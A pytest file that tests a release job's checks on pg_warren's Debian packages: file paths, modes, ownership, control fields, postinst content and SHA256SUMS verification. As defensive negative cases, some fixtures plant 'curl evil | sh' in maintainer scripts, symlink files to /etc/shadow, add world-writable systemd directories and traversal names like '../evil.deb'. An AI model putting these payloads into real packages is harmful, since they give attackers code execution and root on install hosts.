"""Tests of release/assets.py, the publish job's checks of what the read-only
jobs built before anything is signed or published (CONTRIBUTING.md,
"Packages"): each .deb holds only pg_warren's files and the postinst
packaging/debian renders, is named and versioned for the release, and an
earlier release's packages are taken only as its signed SHA256SUMS lists
them."""

import hashlib
import io
import re
import shutil
import tarfile

import pytest

from assets import (AssetError, asset_name, check_deb, expected_postinst, listed_debs, readme_fingerprint,
                    verify_listed)

pytestmark = pytest.mark.skipif(shutil.which("dpkg-deb") is None, reason="needs dpkg-deb")

FINGERPRINT = "0123456789ABCDEF0123456789ABCDEF01234567"


def control_text(major, version, arch):
    """A package's control file as dh_gencontrol writes it from
    packaging/debian/control.in (a real build's, PG 16 on bookworm)."""
    return (f"Package: postgresql-{major}-pg-warren\n"
            "Source: pg-warren\n"
            f"Version: {version}\n"
            f"Architecture: {arch}\n"
            "Maintainer: Will Faithfull <wfaithfull@users.noreply.github.com>\n"
            "Installed-Size: 12172\n"
            f"Depends: postgresql-{major}, libc6 (>= 2.35), libgcc-s1 (>= 4.2)\n"
            "Section: database\n"
            "Priority: optional\n"
            "Homepage: https://github.com/ExaDev/pg_warren\n"
            f"Description: index-free-adjacency traversal and graph compute for PostgreSQL {major}\n"
            " pg_warren builds a compressed adjacency (CSR) of a graph held in ordinary\n"
            " tables, and runs traversals (BFS, walks, shortest paths) and graph compute\n"
            " (PageRank, components, community detection, spectral methods) over it\n"
            " from SQL.\n"
            " .\n"
            " Add pg_warren to shared_preload_libraries and restart PostgreSQL, then run\n"
            " CREATE EXTENSION pg_warren in each database.\n")


def entry(name, data=None, mode=None, owner=(0, 0, "root", "root"), link=None):
    """A tar member: a directory when `data` is None, else a regular file
    (or a symbolic link to `link`)."""
    info = tarfile.TarInfo(f"./{name}" if name else ".")
    info.uid, info.gid, info.uname, info.gname = owner
    if link is not None:
        info.type, info.linkname, info.mode = tarfile.SYMTYPE, link, 0o777
    elif data is None:
        info.type, info.mode = tarfile.DIRTYPE, 0o755 if mode is None else mode
    else:
        info.size, info.mode = len(data), 0o644 if mode is None else mode
    return info, data


def tar_gz(entries, format=tarfile.GNU_FORMAT):
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w:gz", format=format) as archive:
        for info, data in entries:
            archive.addfile(info, io.BytesIO(data) if data is not None and info.isreg() else None)
    return raw.getvalue()


def ar(path, members):
    """A Debian package's ar container of `members` ({name: bytes})."""
    with open(path, "wb") as out:
        out.write(b"!<arch>\n")
        for name, data in members.items():
            out.write(f"{name:<16}{0:<12}{0:<6}{0:<6}{100644:<8}{len(data):<10}`\n".encode())
            out.write(data + (b"\n" if len(data) % 2 else b""))


def build(directory, major="16", version="0.7.0-1~deb12", arch="amd64", files=None, control=None, postinst=None,
          control_extra=None, name=None, modes=None, owners=None, directories=(), links=None):
    """A package laid out as packaging/debian builds one, with overrides:
    `modes` and `owners` ({path: mode or (uid, gid, uname, gname)}) of
    files and directories, extra `directories`, symbolic `links`
    ({path: target}) and the `control` file's text."""
    files = files if files is not None else {
        f"usr/lib/postgresql/{major}/lib/pg_warren.so": b"\x7fELF",
        f"usr/share/postgresql/{major}/extension/pg_warren.control": b"default_version = '0.7.0'\n",
        f"usr/share/postgresql/{major}/extension/pg_warren--0.7.0.sql": b"CREATE SCHEMA warren;\n",
        f"usr/share/postgresql/{major}/extension/pg_warren--0.6.0--0.7.0.sql": b"SELECT 1;\n",
        f"usr/share/doc/postgresql-{major}-pg-warren/copyright": b"Apache-2.0\n",
        f"usr/share/doc/postgresql-{major}-pg-warren/changelog.Debian.gz": b"x",
    }
    modes, owners, links = modes or {}, owners or {}, links or {}
    paths = [*files, *links, *directories]
    parents = {"/".join(p.split("/")[:i]) for p in paths for i in range(len(p.split("/")))} | set(directories)
    data = []
    for path in sorted(parents):
        data.append(entry(path, mode=modes.get(path), **({"owner": owners[path]} if path in owners else {})))
    for path, content in sorted(files.items()):
        data.append(entry(path, content, modes.get(path), **({"owner": owners[path]} if path in owners else {})))
    for path, target in sorted(links.items()):
        data.append(entry(path, link=target))
    ctrl = {"control": (control if control is not None else control_text(major, version, arch)).encode(),
            "md5sums": b"", "postinst": postinst if postinst is not None else expected_postinst(major),
            **(control_extra or {})}
    control_entries = [entry("")] + [entry(n, d, 0o755 if n not in ("control", "md5sums") else 0o644)
                                     for n, d in ctrl.items()]
    deb = directory / (name or asset_name(f"postgresql-{major}-pg-warren", version, arch))
    ar(deb, {"debian-binary": b"2.0\n", "control.tar.gz": tar_gz(control_entries), "data.tar.gz": tar_gz(data)})
    return deb


def test_the_asset_name_has_no_tilde_as_github_would_rename_it():
    assert asset_name("postgresql-16-pg-warren", "0.7.0-1~deb12", "amd64") == \
        "postgresql-16-pg-warren_0.7.0-1.deb12_amd64.deb"


def test_the_postinst_is_the_template_as_debhelper_renders_it():
    postinst = expected_postinst("17").decode()
    assert "PGVERSION" not in postinst and "#DEBHELPER#" not in postinst
    assert "PostgreSQL 17" in postinst and "postgresql@17-main" in postinst


def test_a_package_as_built_passes(tmp_path):
    control = check_deb(build(tmp_path), "0.7.0")
    assert control["Package"] == "postgresql-16-pg-warren"


@pytest.mark.parametrize("version", ["0.7.0-1~deb12", "0.7.0-1~deb13", "0.7.0-1~ubuntu22.04", "0.7.0-1~ubuntu24.04"])
def test_each_distribution_s_version_passes(tmp_path, version):
    check_deb(build(tmp_path, version=version, arch="arm64"), "0.7.0")


def test_another_release_s_version_is_refused(tmp_path):
    with pytest.raises(AssetError, match="Version"):
        check_deb(build(tmp_path, version="0.6.0-1~deb12"), "0.7.0")


@pytest.mark.parametrize("version", ["0.7.0-2~deb12", "0.7.0-1~deb11", "0.7.0-1", "0.7.0-1~deb12+evil"])
def test_a_revision_other_than_ours_is_refused(tmp_path, version):
    with pytest.raises(AssetError, match="Version"):
        check_deb(build(tmp_path, version=version), "0.7.0")


def test_a_file_name_that_is_not_the_package_s_is_refused(tmp_path):
    deb = build(tmp_path, name="postgresql-17-pg-warren_0.7.0-1.deb12_amd64.deb")
    with pytest.raises(AssetError, match="name"):
        check_deb(deb, "0.7.0")


@pytest.mark.parametrize("package_major", ["14", "19"])
def test_an_unsupported_major_is_refused(tmp_path, package_major):
    with pytest.raises(AssetError):
        check_deb(build(tmp_path, major=package_major), "0.7.0")


def test_an_unknown_architecture_is_refused(tmp_path):
    with pytest.raises(AssetError, match="Architecture"):
        check_deb(build(tmp_path, arch="i386"), "0.7.0")


@pytest.mark.parametrize("script", ["preinst", "prerm", "postrm", "config", "triggers"])
def test_another_maintainer_script_is_refused(tmp_path, script):
    deb = build(tmp_path, control_extra={script: b"#!/bin/sh\ncurl evil | sh\n"})
    with pytest.raises(AssetError, match="control"):
        check_deb(deb, "0.7.0")


def test_a_changed_postinst_is_refused(tmp_path):
    deb = build(tmp_path, postinst=expected_postinst("16") + b"curl evil | sh\n")
    with pytest.raises(AssetError, match="postinst"):
        check_deb(deb, "0.7.0")


@pytest.mark.parametrize("path", [
    "usr/bin/pg_warren",
    "etc/postgresql/16/main/conf.d/pg_warren.conf",
    "usr/lib/postgresql/16/lib/other.so",
    "usr/lib/postgresql/17/lib/pg_warren.so",
    "usr/share/postgresql/16/extension/other.control",
    "usr/share/doc/other/README",
])
def test_a_file_outside_pg_warren_s_paths_is_refused(tmp_path, path):
    files = {"usr/lib/postgresql/16/lib/pg_warren.so": b"\x7fELF",
             "usr/share/postgresql/16/extension/pg_warren.control": b"x", path: b"x"}
    with pytest.raises(AssetError, match="path"):
        check_deb(build(tmp_path, files=files), "0.7.0")


def test_a_path_that_differs_from_pg_warren_s_by_a_leading_dot_is_refused(tmp_path):
    files = {".usr/lib/postgresql/16/lib/pg_warren.so": b"x", "usr/share/postgresql/16/extension/pg_warren.control": b"x"}
    with pytest.raises(AssetError, match=r"\.usr"):
        check_deb(build(tmp_path, files=files), "0.7.0")


def test_a_package_without_the_library_is_refused(tmp_path):
    with pytest.raises(AssetError, match="pg_warren.so"):
        check_deb(build(tmp_path, files={"usr/share/postgresql/16/extension/pg_warren.control": b"x"}), "0.7.0")


def test_a_symlink_is_refused(tmp_path):
    deb = build(tmp_path, links={"usr/share/postgresql/16/extension/pg_warren--evil.sql": "/etc/shadow"})
    with pytest.raises(AssetError, match="regular"):
        check_deb(deb, "0.7.0")


@pytest.mark.parametrize("directory", [
    "etc",
    "etc/systemd/system/postgresql@16-main.service.d",
    "usr/lib/postgresql/16/lib/bitcode",
    "usr/share/postgresql/16/extension/pg_warren",
    "var/lib/postgresql",
])
def test_a_directory_off_pg_warren_s_paths_is_refused(tmp_path, directory):
    with pytest.raises(AssetError, match="directory"):
        check_deb(build(tmp_path, directories=[directory]), "0.7.0")


@pytest.mark.parametrize("directory", ["", "usr", "usr/lib/postgresql/16/lib", "usr/share/doc/postgresql-16-pg-warren"])
@pytest.mark.parametrize("mode", [0o777, 0o775, 0o757, 0o700, 0o1755, 0o2755])
def test_a_directory_whose_mode_is_not_0755_is_refused(tmp_path, directory, mode):
    with pytest.raises(AssetError, match="mode"):
        check_deb(build(tmp_path, modes={directory: mode}), "0.7.0")


@pytest.mark.parametrize("path", [
    "usr/lib/postgresql/16/lib/pg_warren.so",
    "usr/share/postgresql/16/extension/pg_warren.control",
    "usr/share/doc/postgresql-16-pg-warren/copyright",
])
@pytest.mark.parametrize("mode", [0o666, 0o664, 0o646, 0o755, 0o4644, 0o2644, 0o1644, 0o600])
def test_a_file_whose_mode_is_not_0644_is_refused(tmp_path, path, mode):
    with pytest.raises(AssetError, match="mode"):
        check_deb(build(tmp_path, modes={path: mode}), "0.7.0")


@pytest.mark.parametrize("path", ["", "usr/lib/postgresql/16/lib", "usr/lib/postgresql/16/lib/pg_warren.so",
                                  "usr/share/postgresql/16/extension/pg_warren--0.7.0.sql"])
@pytest.mark.parametrize("owner", [(0, 0, "postgres", "root"), (0, 0, "root", "postgres"), (999, 0, "", ""),
                                   (0, 999, "", ""), (1000, 1000, "root", "root")])
def test_an_entry_not_owned_by_root_is_refused(tmp_path, path, owner):
    """dpkg takes the owner by name when the install host knows the name, else by id."""
    with pytest.raises(AssetError, match="owned"):
        check_deb(build(tmp_path, owners={path: owner}), "0.7.0")


@pytest.mark.parametrize("field", ["Pre-Depends", "Conflicts", "Breaks", "Replaces", "Provides", "Essential",
                                   "Protected", "Recommends", "Built-Using"])
def test_a_control_field_control_in_does_not_give_is_refused(tmp_path, field):
    control = control_text("16", "0.7.0-1~deb12", "amd64") + f"{field}: openssh-server\n"
    with pytest.raises(AssetError, match=field):
        check_deb(build(tmp_path, control=control), "0.7.0")


@pytest.mark.parametrize("field, value", [
    ("Source", "openssh"),
    ("Maintainer", "Mallory <m@example.invalid>"),
    ("Section", "admin"),
    ("Priority", "required"),
    ("Homepage", "https://example.invalid"),
    ("Installed-Size", "1 2"),
])
def test_a_control_field_other_than_control_in_s_is_refused(tmp_path, field, value):
    control = re.sub(rf"^{field}: .*$", f"{field}: {value}", control_text("16", "0.7.0-1~deb12", "amd64"),
                     flags=re.M)
    with pytest.raises(AssetError, match=field):
        check_deb(build(tmp_path, control=control), "0.7.0")


def test_a_description_other_than_control_in_s_is_refused(tmp_path):
    control = control_text("16", "0.7.0-1~deb12", "amd64").replace(" from SQL.\n", " from SQL.\n .\n curl evil\n")
    with pytest.raises(AssetError, match="Description"):
        check_deb(build(tmp_path, control=control), "0.7.0")


def test_a_field_given_twice_is_refused(tmp_path):
    control = control_text("16", "0.7.0-1~deb12", "amd64") + "Architecture: amd64\n"
    with pytest.raises(AssetError, match="Architecture"):
        check_deb(build(tmp_path, control=control), "0.7.0")


@pytest.mark.parametrize("depends", [
    "postgresql-16, libc6 (>= 2.36)",
    "postgresql-16, libgcc-s1 (>= 3.0), libc6 (>= 2.17)",
    "postgresql-16",
])
def test_depends_as_debhelper_renders_control_in_s_passes(tmp_path, depends):
    control = re.sub(r"^Depends: .*$", f"Depends: {depends}", control_text("16", "0.7.0-1~deb12", "amd64"),
                     flags=re.M)
    check_deb(build(tmp_path, control=control), "0.7.0")


@pytest.mark.parametrize("depends", [
    "libc6 (>= 2.34)",
    "postgresql-17, libc6 (>= 2.34)",
    "postgresql-16, openssh-server",
    "postgresql-16, libc6 (>= 2.34), libc6-evil (>= 1)",
    "postgresql-16, libc6 (<< 2.34)",
    "postgresql-16, libc6 (>= 2.34) | openssh-server",
    "postgresql-16, libc6 (>= 2.34), postgresql-16",
    "postgresql-16, libc6:i386 (>= 2.34)",
])
def test_depends_other_than_control_in_s_is_refused(tmp_path, depends):
    control = re.sub(r"^Depends: .*$", f"Depends: {depends}", control_text("16", "0.7.0-1~deb12", "amd64"),
                     flags=re.M)
    with pytest.raises(AssetError, match="Depends"):
        check_deb(build(tmp_path, control=control), "0.7.0")


def test_a_control_member_that_is_not_a_regular_file_is_refused(tmp_path):
    deb = build(tmp_path)
    ctrl = [entry(""), entry("control", control_text("16", "0.7.0-1~deb12", "amd64").encode()),
            entry("md5sums", b""), entry("postinst", link="/etc/shadow")]
    ar(deb, {"debian-binary": b"2.0\n", "control.tar.gz": tar_gz(ctrl),
             "data.tar.gz": tar_gz([entry("usr/lib/postgresql/16/lib/pg_warren.so", b"x")])})
    with pytest.raises(AssetError, match="regular"):
        check_deb(deb, "0.7.0")


def test_a_member_with_pax_headers_is_refused(tmp_path):
    """dpkg-deb writes no pax headers, and Python's tar reader and dpkg's
    could read one differently: a package with one is not ours."""
    deb = build(tmp_path)
    so = "usr/lib/postgresql/16/lib/pg_warren.so"
    library = entry(so, b"x")
    library[0].pax_headers = {"comment": "x"}
    data = [entry(""), *(entry(d) for d in ("usr", "usr/lib", "usr/lib/postgresql", "usr/lib/postgresql/16",
                                            "usr/lib/postgresql/16/lib")),
            library,
            *(entry(d) for d in ("usr/share", "usr/share/postgresql", "usr/share/postgresql/16",
                                 "usr/share/postgresql/16/extension")),
            entry("usr/share/postgresql/16/extension/pg_warren.control", b"x")]
    ctrl = [entry(""), entry("control", control_text("16", "0.7.0-1~deb12", "amd64").encode()),
            entry("md5sums", b""), entry("postinst", expected_postinst("16"), 0o755)]
    ar(deb, {"debian-binary": b"2.0\n", "control.tar.gz": tar_gz(ctrl),
             "data.tar.gz": tar_gz(data, tarfile.PAX_FORMAT)})
    with pytest.raises(AssetError, match="pax"):
        check_deb(deb, "0.7.0")


def test_a_path_given_twice_is_refused(tmp_path):
    deb = build(tmp_path)
    so = "usr/lib/postgresql/16/lib/pg_warren.so"
    data = [entry(""), *(entry(d) for d in ("usr", "usr/lib", "usr/lib/postgresql", "usr/lib/postgresql/16",
                                            "usr/lib/postgresql/16/lib")),
            entry(so, link="/etc/shadow"), entry(so, b"x"),
            *(entry(d) for d in ("usr/share", "usr/share/postgresql", "usr/share/postgresql/16",
                                 "usr/share/postgresql/16/extension")),
            entry("usr/share/postgresql/16/extension/pg_warren.control", b"x")]
    ctrl = [entry(""), entry("control", control_text("16", "0.7.0-1~deb12", "amd64").encode()),
            entry("md5sums", b""), entry("postinst", expected_postinst("16"), 0o755)]
    ar(deb, {"debian-binary": b"2.0\n", "control.tar.gz": tar_gz(ctrl), "data.tar.gz": tar_gz(data)})
    with pytest.raises(AssetError, match="twice"):
        check_deb(deb, "0.7.0")


def test_the_reviewer_s_package_is_refused(tmp_path):
    """A world-writable systemd drop-in directory, a 0666 library, and
    Conflicts and Pre-Depends: each gives root on an install host."""
    control = control_text("15", "0.7.0-1~deb12", "amd64") + "Conflicts: openssh-server\nPre-Depends: libc6\n"
    deb = build(tmp_path, major="15", control=control, directories=["etc/systemd/system/postgresql@15-main.service.d"],
                modes={"etc/systemd/system/postgresql@15-main.service.d": 0o777,
                       "usr/lib/postgresql/15/lib/pg_warren.so": 0o666})
    with pytest.raises(AssetError):
        check_deb(deb, "0.7.0")


def sums(*entries):
    return "".join(f"{digest}  {name}\n" for name, digest in entries)


def test_only_debs_listed_in_the_sums_are_taken():
    text = sums(("postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", "a" * 64),
                ("pg_warren-0.6.0.tar.gz", "b" * 64))
    assert listed_debs(text) == {"postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb": "a" * 64}


@pytest.mark.parametrize("name", ["../evil.deb", "sub/postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", ".deb"])
def test_a_listed_name_that_is_a_path_is_refused(name):
    with pytest.raises(AssetError):
        listed_debs(sums((name, "a" * 64)))


def test_listed_debs_are_checked_against_their_sums(tmp_path):
    good = tmp_path / "postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb"
    good.write_bytes(b"package")
    text = sums((good.name, hashlib.sha256(b"package").hexdigest()))
    assert verify_listed(tmp_path, text) == [good]
    good.write_bytes(b"swapped")
    with pytest.raises(AssetError, match="sha256"):
        verify_listed(tmp_path, text)


def test_a_listed_deb_that_is_missing_is_refused(tmp_path):
    with pytest.raises(AssetError, match="missing"):
        verify_listed(tmp_path, sums(("postgresql-16-pg-warren_0.6.0-1.deb12_amd64.deb", "a" * 64)))


def test_the_readme_names_the_key_s_fingerprint():
    readme = f"... its fingerprint is\n`{FINGERPRINT[:20]} {FINGERPRINT[20:]}` <!-- apt key -->\n..."
    assert readme_fingerprint(readme) == FINGERPRINT


def test_the_fingerprint_may_be_written_as_gpg_prints_it():
    groups = " ".join(FINGERPRINT[i:i + 4] for i in range(0, 40, 4))
    printed = groups[:24] + " " + groups[24:]
    assert readme_fingerprint(f"`{printed}` <!-- apt key -->") == FINGERPRINT


def test_a_readme_without_a_fingerprint_is_refused():
    with pytest.raises(AssetError, match="fingerprint"):
        readme_fingerprint("`set by the owner before the first release` <!-- apt key -->\n")
